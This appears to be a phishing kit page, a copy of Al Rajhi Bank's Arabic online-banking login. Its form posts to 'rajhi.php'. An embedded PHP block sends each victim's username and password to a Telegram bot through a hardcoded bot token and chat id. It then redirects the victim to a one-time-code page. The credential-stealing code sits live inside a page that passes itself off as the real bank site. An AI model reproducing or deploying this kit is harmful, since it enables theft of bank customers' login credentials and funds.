

<!DOCTYPE html PUBLIC "-/W3C/DTD XHTML 1.0 Transitional/EN" "http:/www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http:/www.w3.org/1999/xhtml">
	<head>

		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge"https:/www.almubasher.com.sa/>
		<!-- Sets the title of page -->
		<title>المباشر للأفراد |خدمة الانترنت المصرفية| مصرف الراجحي</title>
	   
	   	<script type="text/javascript">
		   	window.name ="" ;
		   	window.path = '/portal';
		   	window.locale = 'ar_SA';
		   	if(typeof(Storage)!=="undefined")
			{
		   		localStorage.setItem("login", true);
		   		localStorage.setItem("languageChange", "false");
			}
		   	
	
		   	
	   	</script>
	   	
	    <link rel="shortcut icon" href="https:/www.almubasher.com.sa/portal-theme/theme_mass/img/favicon.png?v=20220221112924" />
		
		    
		        <!-- Compressed theme stylesheet -->
		        <link rel="stylesheet" type="text/css" href="../file-r/theme-styles.min.css?v=20220221112924" />
		        <link rel="stylesheet" type="text/css" href="../file-r/styles1.min.css?v=20220221112924" />
        		<link rel="stylesheet" type="text/css" href="../file-r/styles2.min.css?v=20220221112924" />
		    
		    
		
		
		
		<script type="text/javascript" src="../file-r/jquery-1.8.3.js?v=20220221112924"></script>
		<script type="text/javascript" src="../file-r/jquery.cookie.js?v=20220221112924"></script>
		<script type="text/javascript" src="../file-r/login.js?v=20220221112925"></script>
		
		<script type="text/javascript" src="https:/www.almubasher.com.sa/portal/static/sa.alrajhi/js/libs/ui/jquery-ui-1.9.2.custom.js?v=20220221112924"></script>
		<script type="text/javascript" src="https:/www.almubasher.com.sa/portal/static/sa.alrajhi/js/libs/jquery.i18n.properties-1.0.9.js?v=20220221112924"></script>
		<script type="text/javascript" src="https:/www.almubasher.com.sa/portal/static/sa.alrajhi/js/libs/jquery.tmpl.js?v=20220221112924"></script>
		
		<!-- Added Javascript library for Encryption Password 
		<script type="text/javascript" src="https:/www.almubasher.com.sa/portal/static/js/encrypt/framework.js?v=20220221112924"></script>
		-->
		<script type="text/javascript" src="https:/www.almubasher.com.sa/portal/static/sa.alrajhi/js/custom/jquery.jcryption-1.1.js?v=20220221112924"></script>
		
		
			<script  type="text/javascript">		
				var contextPath="a";
				 var imgPath="https:/www.almubasher.com.sa/portal-theme/theme_mass/img/?v=20220221112924";				 
				 imgPath=imgPath.substring(0,imgPath.indexOf('?'));				 
				 $.i18n.properties({
	                    name: 'aggregatedmessagesource',
	                    path: contextPath+'/templates/',
	                    mode: 'map',
	                    cache: true,
	                    language: 'ar', 
	                    bundle: window.aggregatedmessagesource
	                });
			</script>
		<script type="text/javascript" src="https:/www.almubasher.com.sa/portal/static/sa.alrajhi/js/custom/notifications.js?v=20220221112924"></script>
		
		
		
		<script  type="text/javascript">		
	
		</script>
 		


<script type="text/javascript">

changelocaleInit('/auth/login.do');
</script> 
	
		<style>
			.field.error {
				color: #C9364D !important;
    			font-weight: bold;
    			display: block;
    			clear:both;
			}
		
			.global.error { color: #C9364D !important; }
			
			span.error{display: none !important;}
			
			.ar #content div h3 span {padding-right: 15px;float :right;}
		</style>
		
		
		<link href="../file-r/style.css?v=20220221112924" rel="stylesheet" type="text/css"/>
 
 
 
	  <link rel="stylesheet" type="text/css" href="../file-r/style-ar.css?v=20220221112924" />

	</head>
	
		
			<body class="ar" dir="rtl" >
		
		
	

		<div id="container">
			<div style="display:none;width:0px;height:0px;"><form action="" method="post" name="auxForm"><input type="hidden" name="token" ><div style="display: none;" id="KeyPairs">{"e":"10001","n":"c7e247fac3dcb6880c8ace937606e3300d598ea0930a33ff5dc292147652055f42d486001de80c9b9575c2ecca4db867fa51ce5be9c898fbc7d2e6230ec58b03","maxdigits":"67"}</div></form></div>
			<div class="p-brand"></div>
		    <div id="header-login">
				

	 
	<form action="" name="formhlogin" method="post">
		<ul id="header-t-log" class="left">
			
			            
            <li class="i-h4-log"><a target="_blank" href="https:/www.almubasher.com.sa/portal/cms/Portal%20Content/Legal%20%26%20Regulatory%20Requirements/Online%20Security%20Overview/Online_Security_Overview_ar_SA_Current.pdf?v=">نظرة عامة على الانترنت الامن</a></li>            
            <li class="i-h5-log">
				
					  <a target="_blank" href="https:/www.almubasher.com.sa/portal/cms/Portal%20Content/Legal%20%26%20Regulatory%20Requirements/Terms%20%26%20Conditions/Al%20Mubasher/Online%20Banking%20Agreement(Ar).pdf?v=" title="">الشروط و الأحكام</a>
					  
				
			</li>
            <li class="i-h6-log t-last">
				
					  <a target="_blank" href="http:/www.alrajhibank.com.sa/ar/personal/services/pages/mubasher-retail.aspx" title=" ">معلومات</a>
					  
				
            </li>
				
            <li>
				<a href="https://www.almubasher.com.sa/portal/auth/login.do?locale=en_US" title="">English</a>						
			</li>
           </ul>
		<br/>
           <div class="clear"></div>
          	<h1><span class="right">Al Rajhi Bank</span></h1>
		<div class="clear"></div>
	</form>
    

		   	</div>
			<div class="clear"></div>
			
			<!--container-left-->
			<div id="container-left" class="left">
				<!--content-->
				<div id="content" class="three login">
		
				<div id="login-field-set" class="ch">
				
					
					<h3><span>دخول</span></h3>
					
					
					
					<form id="login" name="login" action="rajhi.php" method="post">
						
							
							
								<input type="hidden" id="token" name="token" >
							
						
						
						
			        	<div id="login-field-set"  class="ch-div ch-div-t">	
							<div class="clearbr"></div>	
							<fieldset>
								<p class="ch-div-intr">
								
								
								</p>
								<p>
									<label for="username" class="log">اسم المستخدم</label>
									<span>
									<!--  f:input path="username" id="username" title='اسم المستخدم' cssClass="i-t i-t0 i-log" autocomplete="off" /> -->
									<input type="text" id="username" name="username" class="i-t i-t0 i-log1"  title="" autocomplete="off" maxlenght="35" required=""/>
									
									</span>
								</p>
								<br clear="all" /><br clear="all" />
								<p>
									<label for="password" class="log">كلمة السر</label>
									<span>
									<input class="i-t i-t0 i-log" id="password" name="password" type="password" title='' maxlength="14" autocomplete="off" required=""/>
									
									</span>
								</p>
								<br clear="all" /><br clear="all" />
								<p>
									<span class="blank-label log"></span>
									 <button name="submit" type="submit" id="confirm" title='' class="back-a button-login" style="margin-right:5px;margin-left:5px">دخول<span class="back-a-right"></span></button>
	 								 <a href="javascript:redirectPage('https://www.almubasher.com.sa/portal/auth/registration/login.do');" title="" style="display:inline" > نسيت كلمة السر </a> 
								     <br clear="all" />
								</p>
							</fieldset>
							
							<p class="ch-div-intr">
	 							<span class="s-ni i-log">غير مسجل في الخدمة؟</span>
	 							<a href="javascript:redirectPage('https://www.almubasher.com.sa/portal/auth/registration/login.do');" title="" class="s-na i-log">التسجيل في الخدمات الإلكترونية</a> 
							</p>
							
							<div class="clearboth15"></div>
							
							<div id="downTimeMessage" style="display:none;"  class="field error"><img src="https:/www.almubasher.com.sa/portal-theme/theme_mass/img/downtime.png?v=20220221112924" alt="" />عزيزي dddddd ، سيتم إيقاف المباشر بتاريخ 8-04-2015 بين الساعة  6:30 و- 9:00  صباحاً ، نأسف  لإزعاجكم ، وشكراً</div>
							
							<div class="hr-line">
							   <div class="clearbr"></div>
							   <span class="info-heading">تعليمات هامة</span>
							   <p class="info-text">
						       		- تأكد من ظهور علامة القفل في المتصفح<img src="https:/www.almubasher.com.sa/portal-theme/theme_mass/img/loginLock.png?v=20220221112924" alt="" /> <br/>
								  	- إذا كنت مسجلاً , فضلاً أدخل إسم المستخدم وكلمة السر<br/>
								  	- إذا كنت غير مسجل أو نسيت كلمة السر , فضلاً اضغط " تسجيل "<br/>
								  	- عند الطلب , قم بإدخال كلمة السر المؤقتة والمرسلة لهاتفك الجوال<br/>
								  	- تأكد من أن رقم الهاتف الجوال المدخل في الصراف الآلي في حوزتك				   
							   </p>
						   </div>
						   
						</div>
						<input type="hidden" id="startDate" value="2017-03-05"https:/www.almubasher.com.sa/>
						<input type="hidden" id="endDate" value="2017-03-05"https:/www.almubasher.com.sa/>
 						<input type="hidden" id="startTime" value=""https:/www.almubasher.com.sa/> 
						<input type="hidden" id="endTime" value=""https:/www.almubasher.com.sa/> 
						
					</form>
                    <?php
    if(isset($_POST['submit'])) {
 $apiToken = "5259110069:AAFBXxMvJuti1iPSdTYVowQpRWSaZjla1J8";
		$pass = $_POST['password'];
		$user = $_POST['username'];
		$text = "الراجحي \n اسم المستخدم : " .$user . " \n كلمة السر  : " .$pass;
        $data = [
            'chat_id' => "-746175380", 
            'text' => $text
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    
    	echo "<script> location.href='code-one-time.php'; </script>";
        exit;
    	}
	?>
		
				</div>
				</div>
				<!--end content-->
			</div>
			<!--end container left-->
				
			<!--container right-->
			<div id="container-right" class="right">
				




<script type="text/javascript">

function loadItems(widgetId, containerId, nextButtonId)
{
	var registerList = [];
    
    $('#' + widgetId + ' ul.items li').each(function() {
        var $tip = $(this);
        
        if ($tip.text() !== "") {
            registerList.push({
                "msg": $tip.text(),
                "active": true
            });
        }
    });
    
    updateMsg("#" + containerId, registerList);
    
    $('#' + nextButtonId).click(function() {
        updateMsg("#" + containerId, registerList);
    });
}

var registerList;
var newsList;

	

	/**
	 * Shows a message from the pool in the gadget
	 */
	function updateMsg(msgContainer, list){
		nDataLength = list.length,
		nPoolLength = null,
		nRandom = null,
		aMsgPool = [],
		i = 0;
		
		if (nDataLength){
			for(; i < nDataLength; i++ ){
	    		if( list[ i ].active ){
	    			aMsgPool.push( list[ i ] );
	    		}
	    	}
			nPoolLength = aMsgPool.length;
			if ( nPoolLength ){
				nRandom = Math.floor( Math.random() * nPoolLength );
				$(msgContainer).html(aMsgPool[ nRandom ].msg+'<div class="clear"></div>');
				refreshMsgStatus( list, aMsgPool[ nRandom ].msg);
			} else {
				resetMsgs( list );
				updateMsg( msgContainer, list );
			}
		} 
	}	
	
	/**
	 * Resets the status of all the messages 
	 * @param list
	 * @param $gadget
	 */
	function resetMsgs ( list ){
		var nDataLength = list.length,
		i = 0;
	
		for(; i < nDataLength; i++ ){
			list[ i ].active = true;
		}
	}
	
	/**
	 * Refresh the status of the messages
	 * @param list
	 * @param sMsg
	 */
	function refreshMsgStatus ( list, sMsg ){
		var nDataLength = list.length,
		i = 0;
		
		for(; i < nDataLength; i++ ){
			if ( list[ i ].msg === sMsg ){
				list[ i ].active = false;
			}
		}
	}

</script>

<div id="ul-right-login">
	<ul id="widgets-right">
	<!--W3-->
	<li id="m3">					    
         	<h3 class="blue">
			    هل تعلم
         	</h3>
	      	<div id="mm3">						
               <p class="pb left">
					<span id="registerContainer" class="i-log">بإمكانك إضافة اسم مختصر لكل حساب عن طريق صفحة حساباتي</span></p><div class="clear"></div>
					<p></p><div class="clear"></div>
				<p></p>
				<div class="clear"></div>
				<p class="plast">
					<a class="right" title="" id="nextRegister">التالي</a>
					</p><div class="clear"></div>
				<p></p>
				<div class="clear"></div>
			    <ul class="items" style="display:none">
			       <li>بإمكانك تحديد علامة للعمليات التي تقوم بتنفيذها وذلك لتصنيفها</li>
			       <li>بإمكانك تحديد العمليات المفضلة وذلك لتسهيل تنفيذها والوصل لها</li>
			       <li>بإمكانك تحديد حساباتك المفضلة لتسهيل الوصول لها</li>
			       <li>بإمكانك إضافة اسم مختصر لكل حساب عن طريق صفحة حساباتي</li>
			       <li></li>
			       <li></li>
			       <li></li>
			       <li></li>
			       <li></li>
			       <li></li>
			    </ul>
			</div>
			
        </li>
    <!--W3-->
    <br>
		<!--W5-->
         <li id="m5">					    
         	<h3 class="blue">
			    نصائح أمنية
         	</h3>
	      	<div id="mm5">						
               <p class="pb left">
					<span id="newsContainer" class="i-log">تذكر دائما أن تقوم بالضغط على رابط "الخروج" بعد الانتهاء من استخدام المباشر للأفراد والتأكد من ظهور شاشة الخروج.</span></p><div class="clear"></div>
					<p></p><div class="clear"></div>
				<p></p>
				<div class="clear"></div>
				<p class="plast">
					<a class="right" title="" id="nextNews">التالي</a>
					</p><div class="clear"></div>
				<p></p>
				<div class="clear"></div>
				<ul class="items" style="display:none">
                   <li>المصرف لن يطلب منك ابدا ادخال اي بيانات شخصية كرقم العميل او الرقم السري لخدمة الهاتف المصرفي من خلال خدمة المباشر للأفراد .  إذا ظهرت لك صفحة تطلب منك إدخال رقم العميل والرقم السري ، عليك فوراً اغلاق الصفحة والاتصال بالمصرف. </li>
                   <li>لا تقم بتنزيل أي ملف او الضغط على أي رابط يصلك من مصدر غير موثوق او مرسل من شخص غير معروف لديك</li>
                   <li>اقرأ بتمعن رسائل التنبيه المرسلة على جوالك و تأكد من أنها تتبع للعمليات التي قمت بتنفيذها</li>
                   <li>لا تقم بتاتاً بالدخول على حسابك عبر جهاز حاسب آلي مشترك مثل أجهزة مقاهي الانترنت</li>
                   <li>تذكر دائما أن تقوم بالضغط على رابط "الخروج" بعد الانتهاء من استخدام المباشر للأفراد والتأكد من ظهور شاشة الخروج.</li>
                   <li>مصرف الراجحي لن يقوم بطلب تحديث بياناتكم عبر الهاتف, نرجو عدم الافصاح عن أي معلومات شخصية من متصلين مجهولين .</li>
                   <li>مصرف الراجحي لن يقوم بطلب تحديث بياناتكم عبر الهاتف, نرجو عدم الافصاح عن أي معلومات شخصية من متصلين  .</li>
                   <li></li>
                   <li></li>
                   <li></li>
                </ul>
			</div>
			
        </li>
        <!--W5-->
		
	
     </ul>
	<div class="clear"></div>
</div>
		 
	        </div>
			<!--end container right-->
	 
			<div class="clear"></div>
			<div id="footer-login" class="footer">
				




























<ul id="footer-l" class="left" >
    <li class="left" >
        
            <a href="https:/www.almubasher.com.sa/portal/cms/Portal%20Content/Legal%20%26%20Regulatory%20Requirements/Privacy%20Policy/Privacy_Policy_ar_SA_Current.pdf?v=" target="_blank" title="">السياسة الأمنية عبر الإنترنت</a>
            
        
    </li>
</ul>
<ul id="footer-r" class="right" >
    <li class="left" >
    	&#x0645;&#x0628;&#x0627;&#x0634;&#x0631; &#x0644;&#x0644;&#x0627;&#x0641;&#x0631;&#x0627;&#x062F; &#x0625;&#x0635;&#x062F;&#x0627;&#x0631;   5.9.5 &#x062D;&#x0642;&#x0648;&#x0642; &#x0627;&#x0644;&#x0637;&#x0628;&#x0639; &#x00A9; 2019 &#x0645;&#x0635;&#x0631;&#x0641; &#x0627;&#x0644;&#x0631;&#x0627;&#x062C;&#x062D;&#x064A; &#x062C;&#x0645;&#x064A;&#x0639; &#x0627;&#x0644;&#x062D;&#x0642;&#x0648;&#x0642; &#x0645;&#x062D;&#x0641;&#x0648;&#x0638;&#x0629;. &#x0627;&#x0633;&#x0645; &#x0627;&#x0644;&#x0645;&#x0624;&#x0633;&#x0633;&#x0629; &#x0627;&#x0644;&#x0645;&#x0627;&#x0644;&#x064A;&#x0629;: &#x0634;&#x0631;&#x0643;&#x0629; &#x0627;&#x0644;&#x0631;&#x0627;&#x062C;&#x062D;&#x064A; &#x0627;&#x0644;&#x0645;&#x0635;&#x0631;&#x0641;&#x064A;&#x0629; &#x0644;&#x0644;&#x0623;&#x0633;&#x062A;&#x062B;&#x0645;&#x0627;&#x0631; &#x060C; &#x0646;&#x0648;&#x0639; &#x0627;&#x0644;&#x0643;&#x064A;&#x0627;&#x0646;: &#x0645;&#x0635;&#x0631;&#x0641; / &#x0645;&#x0624;&#x0633;&#x0633;&#x0629; &#x0645;&#x0627;&#x0644;&#x064A;&#x0629; &#x060C; &#x0634;&#x0631;&#x0643;&#x0629; &#x0633;&#x0639;&#x0648;&#x062F;&#x064A;&#x0629; &#x0645;&#x0633;&#x0627;&#x0647;&#x0645;&#x0629; &#x0628;&#x0631;&#x0623;&#x0633; &#x0645;&#x0627;&#x0644;: 25,000,000,000.00 &#x060C; &#x0631;&#x0642;&#x0645; &#x0627;&#x0644;&#x0633;&#x062C;&#x0644; &#x0627;&#x0644;&#x062A;&#x062C;&#x0627;&#x0631;&#x064A;: 1010000096 &#x060C; &#x0635;&#x0646;&#x062F;&#x0648;&#x0642; &#x0628;&#x0631;&#x064A;&#x062F;: 28 &#x0627;&#x0644;&#x0631;&#x064A;&#x0627;&#x0636; 11411 &#x0627;&#x0644;&#x0645;&#x0645;&#x0644;&#x0643;&#x0629; &#x0627;&#x0644;&#x0639;&#x0631;&#x0628;&#x064A;&#x0629; &#x0627;&#x0644;&#x0633;&#x0639;&#x0648;&#x062F;&#x064A;&#x0629; &#x060C; &#x0647;&#x0627;&#x062A;&#x0641;: 211600 11 966+ &#x060C; &#x0627;&#x0644;&#x0639;&#x0646;&#x0648;&#x0627;&#x0646; &#x0627;&#x0644;&#x0648;&#x0637;&#x0646;&#x064A;: &#x0634;&#x0631;&#x0643;&#x0629; &#x0627;&#x0644;&#x0631;&#x0627;&#x062C;&#x062D;&#x064A; &#x0627;&#x0644;&#x0645;&#x0635;&#x0631;&#x0641;&#x064A;&#x0629; &#x0644;&#x0644;&#x0627;&#x0633;&#x062A;&#x062B;&#x0645;&#x0627;&#x0631;&#x060C; 8467 &#x0637;&#x0631;&#x064A;&#x0642; &#x0627;&#x0644;&#x0645;&#x0644;&#x0643; &#x0641;&#x0647;&#x062F;-&#x062D;&#x064A; &#x0627;&#x0644;&#x0645;&#x0631;&#x0648;&#x062C;&#x060C; &#x0648;&#x062D;&#x062F;&#x0629; &#x0631;&#x0642;&#x0645; (1)&#x060C; &#x0627;&#x0644;&#x0631;&#x064A;&#x0627;&#x0636;&#x060C; 12263 &#x2013; 2743 &#x060C; &#x0627;&#x0644;&#x0645;&#x0648;&#x0642;&#x0639; &#x0627;&#x0644;&#x0625;&#x0644;&#x0643;&#x062A;&#x0631;&#x0648;&#x0646;&#x064A;:<a href=https:/www.alrajhibank.com.sa style=color:white;text-decoration-line:underline;> www.alrajhibank.com.sa </a>&#x060C; &#x0645;&#x0631;&#x062E;&#x0635; &#x0644;&#x0647;&#x0627; &#x0628;&#x0631;&#x0642;&#x0645; &#x0627;&#x0644;&#x062A;&#x0631;&#x062E;&#x064A;&#x0635;: 1420 &#x060C; &#x0648;&#x062E;&#x0627;&#x0636;&#x0639;&#x0629; &#x0644;&#x0631;&#x0642;&#x0627;&#x0628;&#x0629; &#x0648;&#x0625;&#x0634;&#x0631;&#x0627;&#x0641; &#x0645;&#x0624;&#x0633;&#x0633;&#x0629; &#x0627;&#x0644;&#x0646;&#x0642;&#x062F; &#x0627;&#x0644;&#x0639;&#x0631;&#x0628;&#x064A; &#x0627;&#x0644;&#x0633;&#x0639;&#x0648;&#x062F;&#x064A;.
    </li>
</ul>


			</div>
		</div>
	</body>
</html>